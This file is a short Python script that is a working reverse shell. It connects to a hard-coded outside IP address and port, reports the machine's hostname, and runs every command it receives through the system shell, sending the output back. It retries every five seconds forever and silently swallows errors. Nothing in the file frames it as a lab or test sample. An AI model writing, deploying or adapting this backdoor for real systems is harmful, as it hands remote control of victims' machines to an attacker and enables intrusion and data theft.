import socket
import subprocess
import time

def main():
    server_ip = "50.116.36.173"
    server_port = 7002

    while True:
        try:
            # Create a socket and connect to the server
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(None)
                s.connect((server_ip, server_port))

                # Send the system hostname
                hostname = socket.gethostname()
                s.sendall(hostname.encode() + b"\n")

                # Use a file-like object to read lines from the socket
                # This handles line-buffered commands properly
                f = s.makefile('rb')

                while True:
                    line = f.readline()
                    if not line:
                        break

                    command = line.decode('utf-8').strip()
                    if command:
                        try:
                            # Execute the command and capture output
                            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                            if not output:
                                output = b"Command executed, no output.\n"

                            # Ensure output ends with newline for the receiver
                            if not output.endswith(b"\n"):
                                output += b"\n"

                            s.sendall(output)
                        except subprocess.CalledProcessError as e:
                            # Send the output of the failed command
                            err_output = e.output if e.output else str(e).encode()
                            if not err_output.endswith(b"\n"):
                                err_output += b"\n"
                            s.sendall(err_output)
                        except Exception as e:
                            # Send other error messages
                            s.sendall(str(e).encode() + b"\n")
        except Exception:
            # Connection failed or other error, will retry after sleep
            pass

        # Loop continuously with a 5 second sleep between iterations
        time.sleep(5)

if __name__ == "__main__":
    main()
